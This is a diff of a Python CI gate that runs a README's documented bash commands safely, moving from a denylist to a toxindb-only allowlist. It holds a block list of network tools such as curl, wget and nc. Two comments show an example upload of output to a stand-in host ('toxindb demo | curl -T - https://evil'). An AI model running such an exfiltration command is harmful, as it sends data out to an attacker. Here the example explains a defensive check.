@@ -44,14 +44,26 @@ import sys
 import tempfile
 from pathlib import Path
 
-# A command is split into its chained steps and each step judged separately.
-# Only steps that are not shell setup can make the command skippable.
+# Only a step that actually invokes toxindb may be executed.
 #
-# This distinction is the whole reason the split exists. `cd . && toxindb
+# The first version of this gate worked the other way round: it enumerated
+# commands that were unsafe and ran everything else. That is the wrong default,
+# because "not on the list" silently becomes "run it" -- and a documented
+# `toxindb demo | curl ...` line would have been executed, breaking the offline
+# promise this project makes. Here anything unrecognised is skipped, and says so.
+RUNNABLE_STEPS: tuple[re.Pattern[str], ...] = (
+    re.compile(r"^\s*toxindb\b"),
+    re.compile(r"^\s*python3?\s+-m\s+toxindb\b"),
+)
+
+# Steps that only prepare the shell; they carry no assertion about toxindb and
+# must not decide whether the command is skippable.
+#
+# This distinction is the whole reason commands are split. `cd . && toxindb
 # monitor <broken path>` used to be skipped, because the skip rules matched
-# the whole line and `cd` matched "directory navigation". The documented
-# command then rotted in plain sight and the job stayed green. Setup decides
-# where a command runs; the payload decides whether the job can check it.
+# the whole line and `cd` matched "directory navigation". The documented command
+# then rotted in plain sight and the job stayed green. Setup decides where a
+# command runs; the payload decides whether the job can check it.
 SETUP_STEPS: re.Pattern[str] = re.compile(
     r"^\s*(?:"
     r"(?:cd|pushd)\b"              # change directory
@@ -67,16 +79,31 @@ SETUP_STEPS: re.Pattern[str] = re.compile(
 UNSAFE_STEPS: tuple[tuple[re.Pattern[str], str], ...] = (
     (re.compile(r"^\s*git\s+clone\b"), "clones the network"),
     (re.compile(r"^\s*git\s+(remote|fetch|pull|push|submodule)\b"), "network"),
-    (re.compile(r"^\s*(?:python3?|\S*tox)?\s*-m\s+pip\b|pip\s+install\b"), "mutates the environment"),
+    (
+        re.compile(
+            r"^\s*(?:python3?\s+-m\s+pip|pip|pip3)\b"
+            r"|^\s*(?:python3?|\S*tox)\s+-m\s+pip\b"
+        ),
+        "mutates the environment",
+    ),
     (re.compile(r"^\s*python3?\s+-m\s+venv\b"), "mutates the environment"),
-    (re.compile(r"^\s*(?:python3?|tox)\s+-m\s+pytest\b|^\s*pytest\b"), "already run by the suite job"),
-    (re.compile(r"^\s*(?:source\b|\.\s+\S*activate)"), "mutates the shell environment"),
+    (
+        re.compile(r"^\s*(?:pytest|py\.test)\b|^\s*python3?\s+-m\s+pytest\b"),
+        "already run by the suite job",
+    ),
+    (
+        re.compile(r"^\s*(?:source\b|\.\s+\S*activate)"),
+        "mutates the shell environment",
+    ),
     (re.compile(r"^\s*(?:rm|mv|cp)\b"), "destructive filesystem operation"),
     (re.compile(r"^\s*(?:touch|chmod|chown)\b"), "filesystem mutation"),
+    (
+        re.compile(
+            r"^\s*(?:curl|wget|nc|ncat|netcat|ssh|scp|sftp|rsync|telnet)\b"
+        ),
+        "opens a network connection",
+    ),
 )
-
-# Shell metacharacters that chain steps together on one line.
-_CHAIN = re.compile(r"\s*(?:&&|\|\||;|\|)\s*")
 
 TIMEOUT_SECONDS = 300
 
@@ -126,11 +153,20 @@ def split_steps(command: str) -> list[str]:
             current.append(ch)
             i += 1
             continue
-        pair = command[i:i + 2]
-        if pair in ("&&", "||", ";", "|"):
+        # Two-character operators are tested before one-character ones, so
+        # that `||` is not read as two pipes. The earlier version compared
+        # *two*-character windows against a list containing the one-character
+        # operators, so `cmd; other` and `cmd | head` were never split at all
+        # and each was judged as a single step.
+        if command[i:i + 2] in ("&&", "||"):
             steps.append("".join(current).strip())
             current = []
             i += 2
+            continue
+        if ch in ";|\n":
+            steps.append("".join(current).strip())
+            current = []
+            i += 1
             continue
         current.append(ch)
         i += 1
@@ -160,6 +196,14 @@ def skip_reason(command: str) -> str | None:
         for pattern, reason in UNSAFE_STEPS:
             if pattern.search(step):
                 return reason
+
+    # Allowlist, not denylist. Every payload step must be a toxindb
+    # invocation; anything this gate does not recognise is skipped and says so.
+    # With a denylist, a documented `toxindb demo | curl -T - https://evil`
+    # would run, because no rule matched the piped stage.
+    for step in payload:
+        if not any(pattern.match(step) for pattern in RUNNABLE_STEPS):
+            return "not a toxindb command"
     return None
 
 
@@ -192,8 +236,20 @@ def _tree_state(root: Path) -> str | None:
     Returns None outside a git checkout, where the assertion is skipped with a
     printed note rather than silently assumed to have passed.
     """
+    # `--ignored=matching` is load-bearing. Without it, a file that
+    # `.gitignore` excludes is invisible here -- and this PR adds
+    # `*_canary_planted.jsonl` to `.gitignore` precisely because following the
+    # README's `--plant` example leaves that file behind. So the very pattern
+    # meant to keep the tree tidy would have blinded the assertion meant to
+    # prove the tree stays tidy. Verified: a planted canary is still caught.
     proc = subprocess.run(
-        ["git", "status", "--porcelain", "--untracked-files=all"],
+        [
+            "git",
+            "status",
+            "--porcelain",
+            "--untracked-files=all",
+            "--ignored=matching",
+        ],
         cwd=root,
         capture_output=True,
         text=True,
@@ -203,24 +259,75 @@ def _tree_state(root: Path) -> str | None:
     return proc.stdout
 
 
-def extract_bash_blocks(markdown: str) -> list[tuple[int, list[str]]]:
-    """Return (line_number, lines) for each fenced ```bash block."""
-    blocks: list[tuple[int, list[str]]] = []
+_FENCE = re.compile(r"^\s*(?P<ticks>`{3,}|~{3,})\s*(?P<info>.*?)\s*$")
+# Info strings that mean "these lines are shell commands". Attribute-suffixed
+# forms count, because ```bash,ignore and ```{.bash} are the same thing as
+# ```bash and matching only the literal string made this gate fail the day the
+# README's fences were restyled.
+_SHELL_WORDS = re.compile(
+    r"\b(?:sh|bash|zsh|shell|console|shell-session|shellsession)\b", re.IGNORECASE
+)
+_UNLABELLED = re.compile(r"^\s*(?P<ticks>`{3,}|~{3,})\s*$")
+
+
+def _is_shell_info(info: str) -> bool:
+    return bool(_SHELL_WORDS.search(info.strip("{}").replace(".", " ")))
+
+
+def extract_shell_blocks(markdown: str) -> tuple[list[tuple[int, list[str]]], list[tuple[int, list[str]]]]:
+    """Split the document's fenced blocks into shell blocks and unlabelled ones.
+
+    Returns ``(shell_blocks, unlabelled_blocks)``.
+
+    An unlabelled fence is *not* treated as shell. The usage synopsis in this
+    README is a bare fence containing lines like
+    ``toxindb monitor   TRACE [--output DIR]`` -- a shape, not a command, and
+    running it would fail on the literal word ``TRACE``. Treating every bare
+    fence as shell therefore trades one silent skip for a loud false failure.
+    The contract stays one sentence: **commands in a ```bash block are
+    executed**, and the unlabelled blocks come back so the caller can say
+    plainly that they were left alone rather than letting them vanish.
+    """
+    shell_blocks: list[tuple[int, list[str]]] = []
+    unlabelled: list[tuple[int, list[str]]] = []
     lines = markdown.splitlines()
     in_block = False
+    shell = False
+    fence = ""
     start = 0
     body: list[str] = []
     for number, line in enumerate(lines, 1):
-        if not in_block and line.strip() == "```bash":
-            in_block, start, body = True, number, []
+        if not in_block:
+            fence_match = _FENCE.match(line)
+            if not fence_match:
+                continue
+            info = fence_match.group("info")
+            plain = _UNLABELLED.match(line)
+            shell = _is_shell_info(info) if info else False
+            if not shell and not plain:
+                # An explicitly non-shell fence (python, json, text, ...).
+                continue
+            in_block = True
+            fence = fence_match.group("ticks")[0]
+            start, body = number, []
             continue
-        if in_block and line.strip() == "```":
-            blocks.append((start, body))
+        # Closing fence: same character, at least as long, no info string.
+        closing = _UNLABELLED.match(line)
+        if closing and closing.group("ticks")[0] == fence:
+            (shell_blocks if shell else unlabelled).append((start, body))
             in_block = False
+            fence, shell = "", False
             continue
-        if in_block:
-            body.append(line)
-    return blocks
+        body.append(line)
+    if in_block:
+        # An unterminated fence. Reported rather than dropped: silently
+        # discarding the contents would hide the commands this gate exists to
+        # run, and would make the block count disagree with the reader's.
+        print(
+            f"::error::{start}: code fence opened here is never closed",
+            file=sys.stderr,
+        )
+    return shell_blocks, unlabelled
 
 
 def logical_commands(lines: list[str]) -> list[str]:
@@ -264,12 +371,21 @@ def main() -> int:
         return 2
 
     markdown = args.readme.read_text(encoding="utf-8")
-    blocks = extract_bash_blocks(markdown)
+    blocks, unlabelled = extract_shell_blocks(markdown)
     if not blocks:
         print(f"error: no ```bash blocks found in {args.readme}", file=sys.stderr)
         print("If the README lost its shell examples, delete this job instead of", file=sys.stderr)
         print("letting it pass vacuously.", file=sys.stderr)
         return 2
+    if unlabelled:
+        # Stated, not silent. A reader who assumes these were checked is worse
+        # off than one who is told they were not.
+        print(
+            f"note: {len(unlabelled)} unlabelled code fence(s) not executed "
+            f"(lines {', '.join(str(s) for s, _ in unlabelled)}); label a fence "
+            f"```bash to have it checked",
+            file=sys.stderr,
+        )
 
     planned: list[tuple[int, str, str | None]] = []
     for start, body in blocks:
@@ -282,9 +398,9 @@ def main() -> int:
             print(f"{state:28} README.md:{line_no}  {command}")
         return 0
 
-    print(f"Checking {len(planned)} command(s) from {args.readme.name}\n")
     failures: list[tuple[int, str, int, str]] = []
     ran = skipped = 0
+    dirty = False
     repo_root = Path(__file__).resolve().parents[2]
     tree_before = _tree_state(repo_root)
 
@@ -303,13 +419,15 @@ def main() -> int:
         # writes into the real tree no matter where it is invoked from. The
         # precondition below refuses to run in that configuration, and the
         # post-run assertion below catches any future leak that slips past it.
-        examples = Path.cwd() / "examples"
+        # From repo_root, not the current directory, so the gate checks the same
+        # tree it lives in whichever directory it was invoked from.
+        examples = repo_root / "examples"
         if examples.is_dir():
             shutil.copytree(examples, workdir / "examples")
         else:
             print(
-                "warning: no examples/ directory found; commands that reference "
-                "bundled fixtures will fail",
+                "warning: no examples/ directory found at {examples}; commands "
+                "that reference bundled fixtures will fail".format(examples=examples),
                 file=sys.stderr,
             )
 
@@ -355,14 +473,32 @@ def main() -> int:
             return 2
         pkg_dir = Path(_pkg.__file__).resolve().parent
         if _is_within(pkg_dir, repo_root):
+            # The remedy differs by cause, and saying the wrong one sends the
+            # reader in a circle. A virtualenv created *inside* the checkout
+            # (`python3 -m venv .venv`) makes an otherwise-correct non-editable
+            # install land back inside the repository, so telling them to drop
+            # `-e` when they never used it is useless.
+            venv_dirs = sorted(
+                p.name
+                for p in repo_root.iterdir()
+                if p.is_dir() and (p / "pyvenv.cfg").is_file()
+            ) if repo_root.is_dir() else []
+            cause = (
+                f"A virtualenv inside the checkout ({', '.join(venv_dirs)}) puts "
+                f"site-packages back under the repository."
+                if venv_dirs
+                else "This is the signature of an editable install (`pip install -e .`)."
+            )
             print(
                 f"error: toxindb is loaded from {pkg_dir}, which is inside the "
                 f"repository at {repo_root}.\n"
                 f"`toxindb demo` regenerates its fixtures relative to the package "
                 f"directory, so running the documented commands would write into "
                 f"the checkout.\n"
-                f"Re-run this check against a non-editable install: "
-                f"`pip install .` (not `pip install -e .`).",
+                f"{cause}\n"
+                f"Create the virtualenv outside the checkout (for example "
+                f"`python3 -m venv /tmp/toxindb-docs-venv`) and run this check with "
+                f"that interpreter.",
                 file=sys.stderr,
             )
             return 2
@@ -371,12 +507,23 @@ def main() -> int:
             f"fixture regeneration cannot dirty the tree)"
         )
 
+        # Printed here rather than before the guards so that a guard's
+        # diagnosis is the last thing on the screen, rather than a cheerful
+        # "Checking 17 command(s)" followed immediately by a refusal to
+        # check any of them.
+        print(f"Checking {len(planned)} command(s) from {args.readme.name}\n")
+
         for line_no, command, reason in planned:
             if reason:
                 skipped += 1
                 print(f"  SKIP  README.md:{line_no:<5} ({reason})")
                 continue
             ran += 1
+            # Captured per command, and compared against *this* command's own
+            # prior state. Comparing every command against the run's starting
+            # state instead would report the first leaker and then blame every
+            # later command for a tree that was already dirty.
+            tree_previous = _tree_state(repo_root)
             try:
                 completed = subprocess.run(
                     command,
@@ -391,6 +538,27 @@ def main() -> int:
             except subprocess.TimeoutExpired:
                 rc, output = 124, f"timed out after {TIMEOUT_SECONDS}s"
 
+            # Checked per command, not only at the end. The end-of-run assertion
+            # below is what fails the job; this is what names the culprit, which
+            # is the difference between a report a maintainer can act on and a
+            # red job they have to bisect by hand.
+            state_now = _tree_state(repo_root)
+            if (
+                tree_previous is not None
+                and state_now is not None
+                and state_now != tree_previous
+            ):
+                print(
+                    f"  DIRTY README.md:{line_no:<5} {command}  "
+                    f"(modified the working tree)"
+                )
+                for entry in _diff_lines(tree_previous, state_now):
+                    if entry.startswith(("+", "-")) and not entry.startswith(
+                        ("+++", "---")
+                    ):
+                        print(f"        | {entry}")
+                dirty = True
+
             if rc == 0:
                 print(f"  PASS  README.md:{line_no:<5} {command}")
             else:
@@ -401,6 +569,19 @@ def main() -> int:
                 failures.append((line_no, command, rc, output))
 
     print(f"\n{ran} command(s) executed, {skipped} skipped, {len(failures)} failed")
+
+    # Floor on executed commands. A gate that executes nothing and reports
+    # "0 failed" is indistinguishable from a green gate, and the most likely
+    # cause is a README that stopped being parsed -- not a README that became
+    # correct.
+    if ran == 0:
+        print(
+            "::error::no documented command was executed. Either the README's "
+            "shell examples have all become unrecognised, or the skip rules "
+            "now reject every command. Both are failures, not passes.",
+            file=sys.stderr,
+        )
+        return 1
 
     tree_after = _tree_state(repo_root)
     if tree_before is None or tree_after is None:
@@ -415,6 +596,11 @@ def main() -> int:
         )
         for line in _diff_lines(tree_before, tree_after):
             print(f"  {line}", file=sys.stderr)
+        return 1
+    elif dirty:
+        # Unreachable while the comparison above is exact, but kept so the
+        # per-command report and the exit code cannot disagree.
+        print("::error::a documented command modified the working tree", file=sys.stderr)
         return 1
 
     if failures:
